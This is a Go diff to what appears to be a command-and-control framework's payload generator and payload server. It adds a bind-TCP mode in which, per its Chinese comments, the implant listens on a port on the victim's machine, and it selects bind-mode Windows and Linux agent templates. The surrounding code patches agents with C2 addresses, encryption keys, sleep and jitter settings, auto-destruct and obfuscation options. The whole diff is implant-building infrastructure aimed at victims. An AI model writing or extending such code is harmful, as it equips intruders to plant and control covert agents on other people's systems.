@@ -129,6 +129,9 @@ func HandleGenerate(c *gin.Context) {
 			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 		case "TCP":
 			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+		case "BIND-TCP", "正向TCP":
+			// Bind 模式下，Agent 将在受害机监听指定端口
+			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
 		case "DNS":
 			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
 		default:
@@ -192,7 +195,7 @@ func HandleGenerate(c *gin.Context) {
 			})
 		} else {
 			filename := filepath.Base(artifactPath)
-			downloadURL := "/api/downloads/" + filename
+			downloadURL := "/api/payloads/" + filename
 			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
 				MsgType: "success",
 				Content: downloadURL,
@@ -343,17 +346,29 @@ func HandleServePayload(c *gin.Context) {
 	templateName := "client_template_linux"
 	if conf.OS == "windows" {
 		switch strings.ToUpper(ln.Protocol) {
-		case "WS": templateName = "client_template_windows.exe"
-		case "TCP": templateName = "client_template_windows_tcp.exe"
-		case "DNS": templateName = "client_template_windows_dns.exe"
-		default: templateName = "client_template_windows.exe"
+		case "WS":
+			templateName = "client_template_windows.exe"
+		case "TCP":
+			templateName = "client_template_windows_tcp.exe"
+		case "BIND-TCP", "正向TCP":
+			templateName = "client_template_windows_bind.exe"
+		case "DNS":
+			templateName = "client_template_windows_dns.exe"
+		default:
+			templateName = "client_template_windows.exe"
 		}
 	} else {
 		switch strings.ToUpper(ln.Protocol) {
-		case "WS": templateName = "client_template_linux"
-		case "TCP": templateName = "client_template_linux_tcp"
-		case "DNS": templateName = "client_template_linux_dns"
-		default: templateName = "client_template_linux"
+		case "WS":
+			templateName = "client_template_linux"
+		case "TCP":
+			templateName = "client_template_linux_tcp"
+		case "BIND-TCP", "正向TCP":
+			templateName = "client_template_linux_bind"
+		case "DNS":
+			templateName = "client_template_linux_dns"
+		default:
+			templateName = "client_template_linux"
 		}
 		if conf.Arch == "arm64" {
 			templateName += "_arm64"
@@ -374,10 +389,17 @@ func HandleServePayload(c *gin.Context) {
 
 	c2url := ""
 	switch strings.ToUpper(ln.Protocol) {
-	case "WS": c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
-	case "TCP": c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
-	case "DNS": c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
-	default: c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+	case "WS":
+		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+	case "TCP":
+		c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+	case "BIND-TCP", "正向TCP":
+		// Bind 模式下，Agent 在受害端监听
+		c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
+	case "DNS":
+		c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
+	default:
+		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 	}
 
 	patched, err := services.PatchPayload(raw, c2url, ln.EncryptKey, 10, ln.HeartbeatJitter, "", conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode)
